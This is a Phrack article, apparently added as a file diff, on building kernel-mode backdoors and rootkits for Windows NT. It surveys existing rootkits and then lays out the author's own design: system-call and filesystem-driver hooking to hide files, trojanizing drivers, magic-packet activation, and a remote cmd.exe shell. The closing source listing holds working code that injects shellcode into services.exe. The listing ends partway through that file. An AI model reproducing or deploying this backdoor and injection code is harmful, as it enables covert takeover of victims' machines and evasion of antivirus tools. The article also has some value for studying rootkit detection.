@@ -1,0 +1,3476 @@
+
+                           ==Phrack Inc.==
+
+              Volume 0x0b, Issue 0x3e, Phile #0x06 of 0x10
+
+
+|=---------------=[ Kernel-mode backdoors for Windows NT ]=--------------=|
+|=-----------------------------------------------------------------------=|
+|=-----------------=[ firew0rker <firew0rker@nteam.ru> ]=----------------=|
+|=----------------=[ the nobodies <http://www.nteam.ru> ]=---------------=|
+
+--[ Table of contents
+
+  1 - PREFACE
+
+  2 - OVERVIEW OF EXISTING KERNEL-MODE BACKDOORS FOR WINDOWS NT
+    2.1 - NTROOTKIT
+    2.2 - HE4HOOK
+    2.3 - SLANRET (IERK, BACKDOOR-ALI)
+
+  3 - OBSCURITY ON DISK, IN REGISTRY AND IN MEMORY
+
+  4 - MY VARIANT: THORNY PATH
+    4.1 - SHELL
+    4.2 - ACTIVATION AND COMMUNICATION WITH REMOTE CLIENT
+    4.3 - OBSCURITY ON DISK
+
+  5 - CONCLUSION
+  6 - EPILOGUE
+  7 - LIST OF USED SOURCES
+  8 - FILES
+
+--[ 1 - Preface
+
+    This article is intended for those who know the architecture of the 
+Windows NT kernel and the principles of operation of NT drivers. This
+article examines issues involved in the development of kernel-mode tools 
+for stealthy remote administration of Windows NT.
+
+    Recently there has been a tendency of extending the use of Windows NT
+(2000, XP, 2003) from it's classical stronghold as home and 
+office OS to servers. At the same time, the outdated Windows 9x family is 
+replaced by the NT family. Because of this it should be evident that remote
+administration tools (backdoors) and unnoticeable access tools (rootkits)
+for the NT family have a certain value. Most of the published utilities 
+work in user-mode and can thus be detected by Antivirus tools or by manual
+inspection.
+
+    It's quite another matter those works in kernel-mode: They can hide 
+from any user-mode program. Antivirus software will have to suplly kernel-
+mode components in order to detect a kernel-mode-backdoor. Software exists
+that protects against such backdoors (such as IPD, "Integrity Protection
+Driver"), but it's use is not widely spread. Kernel mode backdoors are not
+as widely used as they could be due to their relative complexity in comp-
+arison with user-mode backdoors.
+
+--[ 2 - Overview of existing Kernel-Mode backdoors for Windows NT
+
+    This section briefly reviews existing kernel-mode backdoors for Windows
+    NT.
+    
+----[ 2.1 - Ntrootkit
+    
+    Ntrootkit (c) by Greg Hoglund and a team of free developers [1] is a 
+device driver for Windows NT 4.0 and 2000. It's possibilities (implemented
+and potential):
+
+ - Receiving commands from a remote client. The rk_packet module contains
+   a simplified IP-stack, which uses free IP-address from the subnet where
+   the host on which Ntrootkit has been installed is situated.
+
+   It's MAC and IP addresses are hardcoded in the source. Connection with 
+   the rootkit at that IP is carried out via a TCP connection to any port. 
+   The available commands in rk_command.c are:
+
+       ps - list processes
+       help - self explainatory
+       buffertest, echo and debugint - for debugging purpose
+       hidedir - hide directory/file
+       hideproc - hide process(es)
+       sniffkeys - keyboard spy
+
+   There are also imcomplete pieces of code: Execute commands received via
+   a covert channel and starting a Win32-process from a driver (a hard and
+   complicated task).
+
+ - Encrypt all traffic using Schneier's Blowfish algorithm:
+   rk_blowfish.c is present, but not (yet ?) used
+
+ - Self-defense (rk_defense.c) - hide protected objects (in this
+   case: registry keys), identified by the string "_root_"; redirect
+   launched processes.
+
+   The hiding of processes, directories and files as implemented in 
+   rk_ioman.c is done through hooking the following functions: 
+   
+       NtCreateFile
+       ZwOpenFile
+       ZwQueryDirectoryFile
+       ZwOpenKey
+       ZwQueryKey
+       ZwQueryValueKey
+       ZwEnumerateValueKey
+       ZwEnumerateKey
+       ZwSetValueKey
+       ZwCreateKey
+
+   The way to detect this rootkit:
+
+   Make direct request to filesystem driver, send IRP to it. There is
+   one more module that hooks file handling: rk_files.c, adopted from
+   filemon, but it is not used.
+
+ - Starting processes: An unfinished implementation of it can be found
+   in rk_command.c, another one (which is almost complete and good) is 
+   in rk_exec.c
+
+   The implementation suffers from the fact that Zw* functions which are
+   normally unavailable to drivers directly are called through the system
+   call interface (int 0x2E), leading to problems with different versions
+   of the NT family as system call numbers change.
+
+    It seems like the work on Ntrootkit is very loosely coordinated: every
+    developer does what (s)he considers needed or urgent. Ntrootkit does 
+    not achieve complete (or sufficient) invisibility. It creates device 
+    named "Ntroot", visible from User-Mode.
+
+    When using Ntrootkit for anything practical, one will need some means
+of interaction with the rootkitted system. Shortly: There will be the
+need for some sort of shell. Ntrootkit itself can not give out a shell
+directly, although it can start a process -- the downside is that the
+I/O of that process can not be redirected. One is thus forced to start
+something like netcat. It's process can be hidden, but it's TCP-connection
+will be visible. The missing redirection of I/O is a big drawback.
+    
+    However, Ntrootkit development is still in progress, and it will 
+probably become a fully-functional tool for complete and stealthy remote 
+administration.
+
+----[ 2.2 - He4Hook
+
+    This description is based on [2]. The filesystem access was hooked via
+two different methods in the versions up to and including 2.15b6. Only one
+of it works at one time, and in versions after 2.15b6 the first method was
+removed.
+
+Method A: hook kernel syscalls:
+===============================
+
+ZwCreateFile, ZwOpenFile      - driver version 1.12 and from 1.17 to 
+                                2.15beta6
+IoCreateFile                  - from 1.13 to 2.15beta6
+ZwQueryDirectoryFile, ZwClose - before 2.15beta6
+
+Almost all these exported functions (Zw*) have the following function
+body:
+  mov eax, NumberFunction
+  lea edx, [esp+04h]
+  int 2eh                       ; Syscall interface
+
+    The "NumberFunction" is the number of the called function in the 
+syscalls table (which itself can be accessed via the global variable
+KeServiceDescriptorTable). This variable points to following structure:
+
+typedef struct SystemServiceDescriptorTable
+  {
+    SSD  SystemServiceDescriptors[4];
+  } SSDT, *LPSSDT;
+
+Other structures:
+
+typedef VOID *SSTAT[];
+typedef unsigned char SSTPT[];
+typedef SSTAT *LPSSTAT;
+typedef SSTPT *LPSSTPT;
+
+typedef struct SystemServiceDescriptor
+  {
+    LPSSTAT lpSystemServiceTableAddressTable;
+    ULONG  dwFirstServiceIndex;
+    ULONG  dwSystemServiceTableNumEntries;
+    LPSSTPT lpSystemServiceTableParameterTable;
+  } SSD, *LPSSD;
+
+The DescriptorTable pointed to by KeServiceDescriptorTable is only
+accessible from kernel mode. In User-Mode, there is something called
+KeServiceDescriptorTableShadow -- unfortunately it is not exported.
+
+Base services are in
+
+ KeServiceDescriptorTable->SystemServiceDescriptors[0]
+ KeServiceDescriptorTableShadow->SystemServiceDescriptors[0]
+
+KernelMode GUI services are in
+ KeServiceDescriptorTableShadow->SystemServiceDescriptors[1]
+
+    Other elements of that tables were free at moment when [2] was
+written, in all versions up to WinNt4(SP3-6) and Win2k build 2195.
+Each element of the table is a SSID structure, which contains the 
+following data:
+
+lpSystemServiceTableAddressTable   - A pointer to an array of addresses
+                                     of functions that will be called if
+                                     a matching syscall is called
+                                     
+dwFirstServiceIndex                - Start index for the first function
+
+dwSystemServiceTableNumEntries     - Number of services in table
+
+lpSystemServiceTableParameterTable - An array of bytes specifying the
+                                     number of bytes from the stack that
+                                     will be passed through
+
+In order to hook a system call, He4HookInv replaces the address stored in
+KeServiceDescriptorTable->SystemServiceDescriptos[0].lpSystemServiceTableAddressTableIn
+with a pointer to it's own table.
+
+One can interface with He4HookInv by adding your own services to the
+system call tables. He4HookInv updates both tables:
+
+- KeServiceDescriptorTable
+- KeServiceDescriptorTableShadow.
+
+Otherwise, if it updated only KeServiceDescriptorTable, new services 
+would be unavailable from UserMode. To locate KeServiceDescriptorTable-
+Shadow the following technique is used:
+
+    The function KeAddSystemServiceTable can be used to add services to the
+kernel. It can add services to both tables. Taking into account that its
+0-th descriptor is identical, it's possible, by scanning
+KeAddSystemServiceTable function's code, to find the address of the shadow
+table. You can see how it is done in file He4HookInv.c, function 
+FindShadowTable(void).
+
+    If this method fails for some reason, a hardcoded address is taken
+(KeServiceDescriptorTable-0x230) as location of the shadow table. This 
+address has not changed since WinNT Sp3. Another problem is the search
+for the correct index into the function address array. As almost all Zw*
+functions have an identical first instruction (mov eax, NumberFunction),
+one can get a pointer to the function number easily by adding one byte
+to the address exported by ntoskrnl.exe
+
+Method B: (for driver versions 2.11 and higher)
+===============================================
+
+    The callback tables located in the DRIVER_OBJECT of the file system
+drivers are patched: The IRP handlers of the needed drivers are replaced.
+This includes replacing the pointers to base function handlers 
+(DRIVER_OBJECT->MajorFunction) as well as replacing pointers to the
+drivers unload procedure (DRIVER_OBJECT->DriverUnload).
+
+The following functions are handled:
+
+IRP_MJ_CREATE
+IRP_MJ_CREATE_NAMED_PIPE
+IRP_MJ_CREATE_MAILSLOT
+IRP_MJ_DIRECTORY_CONTROL -> IRP_MN_QUERY_DIRECTORY
+
+For a more detailed description of the redirection of file operations
+refer to the source [2].
+
+----[ 2.3 - Slanret (IERK, Backdoor-ALI)
+
+    The source code for this is unavailable -- it was originally disco-
+vered by some administrator on his network. It is a normal driver 
+("ierk8243.sys") which periodically causes BSODs, and is visible as a
+service called "Virtual Memory Manager".
+
+        "Slanret is technically just one component of a
+         root kit. It comes with a straightforward backdoor
+         program: a 27 kilobyte server called "Krei" that
+         listens on an open port and grants the hacker remote
+         access to the system. The Slanret component is a
+         seven kilobyte cloaking routine that burrows into the
+         system as a device driver, then accepts commands from
+         the server instructing it on what files or processes
+         to conceal." [3]
+
+----[ 3. Stealth on disk, in registry and in memory
+
+    The lower the I/O interception in a rootkit is performed, the harder
+it usually is to detect it's presence. One would think that a reliable 
+place for interception would be the low-level disk operations (read/write
+sectors). This would require handling all filesystems that might be on 
+the hard disk though: FAT16, FAT32, NTFS.
+
+    While FAT was relatively easy to deal with (and some old DOS stealth
+viruses used similar techniques) an implementation of something similar
+on WinNT is a task for maniacs.
+
+    A second place to hook would be hooking dispatch functions of file-
+system drivers: Patch DriverObject->MajorFunction and FastIoDispatch in
+memory or patch the drivers on disk. This has the advantage of being re-
+latively universal and is the method used in HE4HookInv.
+
+    A third possibility is setting a filter on a filesyste driver (FSD).
+This has no advantages in comparison with the previous method, but has 
+the drawback of being more visible (Filemon uses this approach). The
+functions Zw*, Io* can then be hooked either by manipulating the Ke-
+ServiceDescriptorTable or directly patching the function body. It is
+usually quite easy to detect that pointers in KeServiceDescriptorTable
+point to strange locations or that the function body of a function has
+changed. A filter driver is also easy to detect by calling IoGetDevice-
+ObjectPointer and then checking DEVICE_OBJECT->StackSize.
+
+    All normal drivers have their own keys in the registry, namely in
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services.
+
+    The abovementioned rootkits can hide registry keys, but obviously,
+if the system is booted "cleanly", an administrator can see anything that
+was hidden. One can also load a rootkit using ZwSetSystemInformation(
+SystemLoadAndCallimage) without the need to create any registry keys. An
+example of this technique can be found in [6].
+
+    A rootkit loader in a separate file is too unstealthy. It might be a
+smarter move to patch that call into some executable file which is part of
+the system boot. One can use any driver or user-mode program that works 
+with sufficient privileges, or any DLL linked to by it. One has to ask one
+question though: If the newly introduced changes need to be hidden anyway,
+why make two similar but differing procedures (for hiding changes to a
+file as well as hiding the existance of a file) instead of limiting our-
+selves to one ?
+
+    In most cases one can target null.sys. Implementing it's functionality
+is as easy as "hello world", and that is why it is usually replaced with a 
+trojan. But if we are going to have a procedure for hiding changes to a
+file, we can replace ANY driver with a trojan that will substitute the 
+content of the replaced file with the original content to everyone (incl-
+uding the kernel). Upon startup, it will copy itself to some allocated 
+memory area and start a thread there. 
+
+    This will make the trojan almost unnoticeable in memory: No system 
+utility can see the driver any more, as it is just an anonymous memory
+page amongst many. We do not even need a thread, using intercepted IRP 
+dispatch functions of some driver (DriverObject->MajorFunction[IRP_MJ_xxx]).
+We can also use IoQueueWorkItem and KeInsertQueueDpc, so no additional
+threads in SYSTEM will be visible in the task manager. After this is done
+the trojan can unload the driver it was started from, and reload it in a
+clean (unchanged) variant. As a result, high levels of stealth will be 
+achieved by relatively simple means. The original content of the manipu-
+lated file could for example be stored in the trojan's file after the
+trojan itself.
+
+    It will then be sufficient to hook all FSD requests (IRP and FastIO)
+and upon access change the position (and size of the file).
+(CurrentIrpStackLocation->Parameters.*.ByteOffset)
+    
+--[ 4 - My variant: The thorny path
+
+----[ 4.1 - Shell
+
+    I originally intended to do something similarily simple as standard
+user-mode code: Just pass a socket handle for stdin/stdout/stderr to the
+newly created cmd.exe process. I did not find a way to open a useful 
+socket from a driver though, as the interface with the AFD driver (kmode
+core of winsock) is undocumented. Reverse-engineering it's usage was not
+an option either as due to changes between versions my technique would be
+unreliable. I had to find a different way.
+
+First variant
+=============
+
+    We could start our code in the context of some process, using a shell-
+code quite similar to that used in exploits. The code could wait for a TCP
+connection and start cmd.exe with redirected I/O.
+
+    I chose this way when I tired of trying to start a full-fledged win32
+process from a driver. The shellcode is position-independent, searches for
+kernel32.dll in memory and loads the winsock library. All that needs to be
+done is injecting the shellcode into the address space of a process and 
+pass control to the entry point of the shellcode. However, in the process
+of doing this the normal work of the process must not be interrupted, be-
+cause a failure in a critical system process will lead to a failure of the
+whole system.
+
+    So we need to allocate memory, write shellcode there, and create a
+thread with EIP = entry point of the shellcode. Code to do this can be 
+found in the attached file shell.cpp. Unfortunately, when CreateProcess
+is called from the thread started in this way it failed, most probably 
+because something that CreateProcess relies upon was not initialized pro-
+poerly in the context of our thread. We thus need to call CreateProcess
+from a thread context which has everything that CreateProcess needs ini-
+tialized -- we're going to take a thread which belongs to the process we
+are intruding into (I used SetThreadContext for that). One needs to re-
+store the state of the thread prior to the interruption so it can contiue
+it's normal operation.
+
+    So we need to: Save thread context via GetThreadContext, set the EIP 
+to our context via SetThreadContext, wait for the code to complete, and
+then restore the original cont again. The rest is just a usual shellcode 
+for Windows NT (full code in dummy4.asm).
+
+    One unsolved problem remains: If the thread is in waiting state, it 
+will not run until it wakes up. Using ZwAlertThread does not yield any re-
+sult if the thread is in a nonalertable wait state. Fortunately, the 
+thread in services.exe worked without a problem -- this does not imply it
+will stay like this in the future though, so I continued my research:
+
+Second variant
+==============
+
+    Things are not as easy as [4] makes them sound. Creating a full-
+fledged win32-process requires it's registration in the CSRSS subsystem.
+This is accomplished by using CsrClientCallServer(), which receives all
+necessary information about the process (handles, TID, PID, flags). The
+functions calls ZwRequestWaitReplyPort, which receives a handle of a pre-
+viously opened port for connection with CSRSS.
+
+    This port is not open in the SYSTEM process context. Opening it never
+succeeded (ZwConnectPort returned STATUS_PORT_CONNECTION_REFUSED). Play-
+ing with SECURITY_QUALITY_OF_SERVICE didn't help. While disassembling
+ntdll.dll I saw that ZwConnectPort calls were preceded by ZwCreateSection.
+But there was no time and no desire to play with sections. Here is the
+code that didn't work:
+
+VOID InformCsrss(HANDLE hProcess,HANDLE hThread,ULONG pid,ULONG tid)
+{
+        CSRMSG                        csrmsg;
+        HANDLE                        hCurProcess;
+        HANDLE                        handleIndex;
+        PVOID                        p;
+
+        _asm int 3;
+
+        UNICODE_STRING                PortName;
+        RtlInitUnicodeString(&PortName,L"\\Windows\\ApiPort");
+        static  SECURITY_QUALITY_OF_SERVICE QoS =
+                {sizeof(QoS), SecurityAnonymous, 0, 0};
+        /*static  SECURITY_QUALITY_OF_SERVICE QoS =
+                {0x77DC0260,
+                (_SECURITY_IMPERSONATION_LEVEL)2, 0x120101, 0x10000};*/
+        DWORD ret=ZwConnectPort(&handleIndex,&PortName,&QoS,NULL,
+                                NULL,NULL,NULL,NULL);
+                
+        if (!ret) {
+                RtlZeroMemory(&csrmsg,sizeof(CSRMSG));
+                
+                csrmsg.ProcessInformation.hProcess=hProcess;
+                csrmsg.ProcessInformation.hThread=hThread;
+                csrmsg.ProcessInformation.dwProcessId=pid;
+                csrmsg.ProcessInformation.dwThreadId=tid;
+                
+                csrmsg.PortMessage.MessageSize=0x4c;
+                csrmsg.PortMessage.DataSize=0x34;
+                
+                csrmsg.CsrssMessage.Opcode=0x10000;
+                
+        
+        ZwRequestWaitReplyPort(handleIndex,(PORT_MESSAGE*)&csrmsg,
+                                            (PORT_MESSAGE*)&csrmsg);
+        }
+}
+
+    The solution to the problem was obvious; Switch context to one in
+which the port is open, e.g. to the context of any win32-process. I inser-
+ted KeAttachProcess(HelperProcess) before calling Nebbet's InformCsrss,
+and KeDetachProcess afterwards. The role of the HelperProcess was taken
+by calc.exe.
+
+    When I tried using KeAttachProcess that way I failed though: The con-
+text was switched (visible using the proc command in SoftICE), but Csr-
+ClientCallServer returned STATUS_ILLEGAL_FUNCTION. Only Uncle Bill knows
+what was happening inside CSRSS.
+    
+    When trying to frame the whole process creation function into
+KeAttachProcess/KeDetachProcess led to the following error when calling
+ZwCreateProcess: "Break Due to KeBugCheckEx (Unhandled kernel mode
+exception) Error=5 (INVALID_PROCESS_ATTACH_ATTEMPT) ... ".
+
+    A different way to execute my code in the context of an arbitrary
+process is APC. The APC may be kmode or user-mode. As long as only kmode
+APC may overcome nonalertable wait state, all code for process creation
+must be done in kernel mode. Nebbet's code normally works at 
+  IRQL == APC_LEVEL
+Code execution in the context of a given win32-process by means of APC is
+implemented in the StartShell() function, in file ShellAPC.cpp.
+    
+Interaction with the process
+=============================
+
+    Starting a process isn't all. The Backdoor still needs to communicate
+with it: It is necessary to redirect it's stdin/stdout/stderr to our 
+driver. We could do this like most "driver+app"-systems: Create a device
+that is visible from user-mode, open it using ZwOpenFile and pass the
+handle to the starting process (stdin/stdout/stderr). But a named device
+is not stealthy, even if we automatically create a random names. This is
+why I have chosen to use named pipes instead.
+     
+    Windows NT uses named pipes with names like Win32Pipes.%08x.%08x (here
+%08x is random 8-digit numbers) for emulation of anonymous pipes. If we 
+create one more such pipe, nobody will notice. Usually, one uses 2 anon-
+ymous pipes r redirecting I/O of a console application in Win32, but when
+using a named pipe one will be sufficient as it is bi-directional. The 
+driver must create a bi-directional named pipe, and cmd.exe must use it's
+handle as stdin/stdout/stderr.
+
+    The handle can be opened in both kmode and user-mode. The final ver-
+sion uses the first variant, but I have also experimented with the second
+variant -- being able to implement different variants may help evade anti-
+viruses. Starting a process with redirected I/O has been completely imple-
+mented in kernel mode in the file NebbetCreateProcess.cpp.
+
+    There are two main differences between my and Nebbet's code: The fun-
+ctions that are not exported from ntoskrnl.exe but from ntdll, are dyn-
+amically imported (see NtdllDynamicLoader.cpp). The handle to the named
+pipe is opened with ZwOpenFile() and passed to the starting process with
+ZwDuplicateObject with DUPLICATE_CLOSE_SOURCE flag.
+
+    For opening the named pipe from user mode I inject code into a start-
+ing process. I attached the patch (NebbetCreateProcess.diff) for edu-
+cational purposes. It adds a code snippet to a starting process. The 
+patch writes code (generated by a C++ compiler) to a process's stack. For
+independence that code is a function which accepts a pointer to a struc-
+ture containing all the necessary data (API addresses etc) as parameter.
+This structure and a pointer to it are written to the stack together with
+the code of the function itself. ESP of the starting thread is set 4 bytes
+bellow the pointer to the parameters of the function, and EIP to it's en-
+try point. Once the injected code is done executing, it issues a CALL back
+to the original entry point. This example can be modified to be yet 
+another way of injecting code into a working userland process from kernel
+mode.
+
+---[ 4.2 - Activation and communication with the remote client
+
+    If a listening socket is permanently open (and visible to netstat -an)
+it is likely to be discovered. Even if one hides the socket from netstat
+is insufficient as a simple portscan could uncover the port. To remain 
+stealthy a backdoor must not have any open ports visible locally or re-
+motely. It is necessary to use a special packet, which on the one hand
+must be unambigously identified by the backdoor as activation signal, yet
+at the same time must not be so suspicious as to trigger alerts or be fil-
+tered by firewalls. The activation signal could e.g. be a packet contain-
+ing a set of packets at any place (header or data) -- all characteristics
+of the packet (protocol, port etc) should be ignored. This allows for max-
+imum flexibility to avoid aggressive packet filters.
+
+    Obviously, we have to implement some sort of sniffer in order to 
+detect such a special packet. In practice, we have several choices on how
+to implement the sniffer:
+
+1) NDIS protocol driver (advantage: possibility not only to receive
+   packets, but also to send - thus making covert channel for
+   communication with remote client possible; disadvantage: difficulties 
+   with supporting all types of network devices) - applied in ntrootkit;
+
+2) use service provided by IpFilterDriver on w2k and higher
+   (advantages: simple implementation and complete independence
+   from physical layer; disadvantage: receive only);
+
+3) setup filter on 1 of network drivers, through which packets pass
+   through (see [5]);
+
+4) direct appeal to network drivers by some other means for receive
+   and send packets (advantage: can do everything; disadvantage:
+   unexplored area).
+
+    I have chosen variant 2 due to it's simplicity and convenience for both
+described variants of starting a shell. IpFilterDriver used only for
+activation, further connection is made via TCP by means of TDI.
+
+    An example of the usage of IpFilterDriver can be seen in Filtering.cpp
+and MPFD_main.cpp. InitFiltering() loads the IpFilterDriver if it isn't 
+yet loaded. Then it calls SetupFiltering, which sets a filter with 
+IOCTL_PF_SET_EXTENSION_POINTER IOCTL. PacketFilter() is then called on 
+each IP packet. If a keyword is detected StartShellEvent is set and causes
+a shell to be started.
+
+    The variant using shellcode in an existing process works with the
+network in user-mode, thus we do not need to describe anything in detail.
+    
+    A Kernel-mode TCP shell is implemented in NtBackd00r.cpp. When cmd.exe
+is started from a driver with redirected I/O, the link is maintained by 
+the driver. I took the tcpecho example as base for the communitcation mod-
+ule in order not to waste time coding a TDI-client from scratch. 
+DriverEntry() initialises TDI, creates a listening socket and an unnamed 
+device for IoQueueWorkItem.
+
+    For each conenction an instance of the Session class is created. In
+it's OnConnect handler a sequence of operations for creating a process.
+process. As long as this handler is called at IRQL==DISPATCH_LEVEL, it's
+impossible to do all necessary operations directly in it. It's even
+impossible to start a thread because PsCreateSystemThread must be called
+only at PASSIVE_LEVEL according to the DDK. Therefore the OnConnect 
+handler calls IoAllocateWorkItem and IoQueueWorkItem in order to do any
+further operations accomplished in WorkItem handler (ShellStarter 
+function) at PASSIVE_LEVEL.
+
+    ShellStarter calls StartShell() and creates a worker thread
+(DataPumpThread) and 2 events for notifying it about arriving packets and
+named pipe I/O completion. Interaction between the WorkItem/thread and 
+Session class was built with taking a possible sudden disconnect and
+freeing Session into account: syncronisation is accomplished by disabling
+interrupts (it's equivalent of raise IRQL to highest) and by means of 
+DriverStudio classes (SpinLock inside). The Thread uses a copy of some 
+data that must be available even after instance of Session was deleted.
+
+    Initially, DataPumpThread starts one asynchronous read operation 
+(ZwReadFile) from named pipe -- event hPipeEvents[1] notifies about it's
+completion. The other event hPipeEvents[0] notifies about data arrival 
+from the network. After that ZwWaitForMultipleObjects executed in a loop 
+waits for one of these events. In dependence of what event was signaled, 
+the thread does a read from the named pipe and sends data to client, or 
+does a read read from FIFO and writes to pipe. If the Terminating flag 
+is set, thread closes all handles, terminates the cmd.exe process, and 
+then terminates itself. Data arrival is signaled by the hPipeEvents[0] 
+event in Session::OnReceive and Session::OnReceiveComplete handlers. 
+It also used in conjunction with the Terminating flag to notify the thread
+about termination.
+
+    Data resceived from the network is buffered in pWBytePipe FIFO. 
+DataPumpThread reads data from the FIFO to temporary buffers which are 
+allocated for each I/O operation and writes data asynchronously to the
+pipe (ZwWriteFile). The buffers are freed asynchronously in the ApcCallback-
+WriteComplete handler.
+
+    Data transfers from the pipe to the network are also accomplished through
+temporary buffers that are allocated before ZwReadFile and freed in
+Session::OnSendComplete.
+
+Paths of data streams and temporary buffers handling algorithm:
+
+NamedPipe -(new send_buf; ZwReadFile)-> temporary buffer
+
+send_buf -(send)-> Network -> OnSendComplete{delete send_buf}
+
+Network -(OnReceive)-> pWBytePipe -(new rcv_buf)-> temporary
+
+buffer rcv_buf -(ZwWriteFile)-> NamedPipe ->
+                                ApcCallbackWriteComplete{delete rcv_buf}
+
+    In Session::OnReceive handler data is written to the FIFO and the 
+DataPumpThread is notified about it's arrival. If the transport has more
+data available than indicated another buffer is allocated to read the
+rest. When the transport is done - asynchronously - OnReceiveComplete()
+handler is called, which does the same as OnReceive.
+
+----[ 4.3 - Stealth on disk
+
+    I've implemented simple demo module (file Intercept.cpp) which hooks
+dispatch functions of a given filesystem diver to hide the first N bytes of
+a given file. To hook FSD call e.g. Intercept(L"\\FileSystem\\Fastfat").
+There is only 2 FSDs that may be necessary to hook: Fastfat ant Ntfs,
+because NT can boot from these filesystems.
+
+    Intercept() replaces some driver dispatch functions
+(pDriverObject->MajorFunction[...], pDriverObject->FastIoDispatch->...).
+
+    When hooked driver handles IRPs and FastIo calls the corresponding hook
+functions modifies file size and current file offset. Thus all user-mode
+programs see file N bytes smaller than original, containing bytes N to
+last. It allows to implement trick described in part 3.
+
+--[ 5 - Conclusion
+
+    In this article I compared 3 existing Kernel-Mode backdoors for
+Windows NT from a programmers point of view, presented some ideas on making
+a backdoor stealthier as well as my thorny path of writing my own Kernel-
+Mode backdoor.
+
+    What we did not describe was a method of hiding open sockets and TCP
+connections from utilities such as netstat and fport. Netstat uses 
+SnmpUtilOidCpy(), and fport talks directly with drivers
+(\Device\Udp and \Device\Tcp). To hide something from these and all
+similar tools, it's necessary to hook aforementioned drivers with one of
+methods mentioned in section "Stealth on disk, in registry and in
+memory". I did not explore that issue yet. Probably, its consideration
+deserves a separate article. Advice for those who decided to move this
+direction: begin with the study of IpLog sources [5].
+
+--[ 6 - Epilogue
+
+    When/if this article will be published in Phrack, the article itself
+(probably improved and supplemented), its Russian original, and full code
+of all used examples will be published at our site http://www.nteam.ru
+
+--[ 7 - List of used sources
+
+1. http://rootkit.com
+2. "LKM-attack on WinNT/Win2k"
+   http://he4dev.e1.bmstu.ru/He4ProjectRepositary/HookSysCall/
+3. "Windows Root Kits a Stealthy Threat"
+   http://www.securityfocus.com/news/2879
+4. Garry Nebbet. Windows NT/2000 native API reference.
+5. "IP logger for WinNT/Win2k"
+   http://195.19.33.68/He4ProjectRepositary/IpLog/
+
+--[ 8 - Files
+
+----[ 8.1 - Shell.CPP
+
+#include "ntdll.h"
+#include "DynLoadFromNtdll.h"
+#include "NtdllDynamicLoader.h"
+
+#if (DBG)
+#define dbgbkpt __asm int 3
+#else
+#define dbgbkpt
+#endif
+
+const StackReserve=0x00100000;
+const StackCommit= 0x00001000;
+extern BOOLEAN Terminating;
+
+extern "C" char shellcode[];
+extern "C" const CLID_addr;
+extern "C" int const sizeof_shellcode;
+
+namespace NT {
+typedef struct _SYSTEM_PROCESSES_NT4 { // Information Class 5
+    ULONG NextEntryDelta;
+    ULONG ThreadCount;
+    ULONG Reserved1[6];
+    LARGE_INTEGER CreateTime;
+    LARGE_INTEGER UserTime;
+    LARGE_INTEGER KernelTime;
+    UNICODE_STRING ProcessName;
+    KPRIORITY BasePriority;
+    ULONG ProcessId;
+    ULONG InheritedFromProcessId;
+    ULONG HandleCount;
+    ULONG Reserved2[2];
+    VM_COUNTERS VmCounters;
+    SYSTEM_THREADS Threads[1];
+} SYSTEM_PROCESSES_NT4, *PSYSTEM_PROCESSES_NT4;
+}
+
+BOOL FindProcess(PCWSTR process, OUT NT::PCLIENT_ID ClientId)
+{
+        NT::UNICODE_STRING ProcessName;
+        NT::RtlInitUnicodeString(&ProcessName,process);
+        ULONG n=0xFFFF;
+        PULONG q =
+                (PULONG)NT::ExAllocatePool(NT::NonPagedPool,n*sizeof(*q));
+    while (NT::ZwQuerySystemInformation(
+        NT::SystemProcessesAndThreadsInformation, q, n * sizeof *q, 0))
+        {
+                NT::ExFreePool(q);
+                n*=2;
+                q = (PULONG)NT::ExAllocatePool
+                        (NT::NonPagedPool,n*sizeof(*q));
+        }
+
+        ULONG MajorVersion;
+        NT::PsGetVersion(&MajorVersion, NULL, NULL, NULL);
+
+    NT::PSYSTEM_PROCESSES p
+        = NT::PSYSTEM_PROCESSES(q);
+    BOOL found=0;
+        char** pp=(char**)&p;
+    do
+        {
+                if ((p->ProcessName.Buffer)&&(!NT::RtlCompareUnicodeString
+                        (&p->ProcessName,&ProcessName,TRUE)))
+                {
+                        if (MajorVersion<=4)
+                                *ClientId = ((NT::PSYSTEM_PROCESSES_NT4)p)->Threads[0].ClientId;
+                                else *ClientId = p->Threads[0].ClientId;
+                        found=1;
+                        break;
+                }
+                if (!(p->NextEntryDelta)) break;
+                *pp+=p->NextEntryDelta;
+        } while(1);
+        
+        NT::ExFreePool(q);
+    return found;
+}
+
+VOID StartShell()
+{
+        //Search ntdll.dll in memory
+        PVOID pNTDLL=FindNT();        
+        //Dynamicaly link to functions not exported by ntoskrnl,
+        //but exported by ntdll.dll
+        DYNAMIC_LOAD(ZwWriteVirtualMemory)
+        DYNAMIC_LOAD(ZwProtectVirtualMemory)
+        DYNAMIC_LOAD(ZwResumeThread)
+        DYNAMIC_LOAD(ZwCreateThread)
+        HANDLE  hProcess=0,hThread;
+        //Debug breakpoint
+        dbgbkpt;
+        NT::CLIENT_ID clid;
+        //Code must be embedded into thread, which not in nonalertable wait state.
+        //Such thread is in process services.exe, let's find it
+        if(!FindProcess(L"services.exe"/*L"calc.exe"*/,&clid)) {dbgbkpt;
+                return;};
+        NT::OBJECT_ATTRIBUTES attr={sizeof(NT::OBJECT_ATTRIBUTES), 0,NULL, OBJ_CASE_INSENSITIVE};
+        //Open process - get it's descriptor
+        NT::ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &attr, &clid);
+        if (!hProcess) {dbgbkpt;
+                return;};
+        /*NT::PROCESS_BASIC_INFORMATION pi;
+        NT::ZwQueryInformationProcess(hProcess, NT::ProcessBasicInformation, &pi, sizeof(pi), NULL);*/
+        ULONG n = sizeof_shellcode;
+        PVOID p = 0;
+        PVOID EntryPoint;
+
+        //Create code segment - allocate memory into process context
+        NT::ZwAllocateVirtualMemory(hProcess, &p, 0, &n,
+                                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        if (!p) {dbgbkpt;
+                return;};
+
+        //*((PDWORD)(&shellcode[TID_addr]))=(DWORD)clid.UniqueThread;
+        //Write process and thread ID into shellcode, it will be needed for
+        //further operations with that thread
+        *((NT::PCLIENT_ID)(&shellcode[CLID_addr]))=(NT::CLIENT_ID)clid;
+        //Write shellcode to allocated memory
+        ZwWriteVirtualMemory(hProcess, p, shellcode, sizeof_shellcode, 0);
+        //Entry point is at the beginning of shellcode
+        EntryPoint = p;
+
+        //Create stack segment
+    NT::USER_STACK stack = {0};
+    n = StackReserve;
+    NT::ZwAllocateVirtualMemory(hProcess, &stack.ExpandableStackBottom, 0, &n,
+                                MEM_RESERVE, PAGE_READWRITE);
+        if (!stack.ExpandableStackBottom) {dbgbkpt;
+                return;};
